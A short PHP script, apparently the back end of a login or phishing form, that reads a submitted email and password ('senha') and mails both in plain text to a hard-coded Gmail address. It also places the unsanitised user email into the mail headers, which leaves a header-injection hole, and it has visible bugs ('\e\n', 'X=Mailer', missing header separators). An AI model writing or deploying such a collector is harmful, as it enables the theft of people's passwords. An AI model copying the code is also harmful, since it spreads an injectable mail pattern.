<?php

$email = $_POST['email'];
$senha = $_POST['senha'];
$mensagem = "Olá";

//var_dump($email,$senha);

$to = "brenolins100@gmail.com";
$subject = "Contato - Breno";
$body = "Email: ".$email. "\r\n".
        "Senha: ".$senha. "\r\n".
        "Mensagem: ".$mensagem;
$header = "From:brenolins100@gmail.com".
    "Reply-To:".$email. "\e\n".
    "X=Mailer:PHP/".phpversion();

    if(mail($to,$subject,$body,$header)){
        echo "Email enviado com sucesso";
    }else{
        echo "Erro ao enviar email";
    }

?>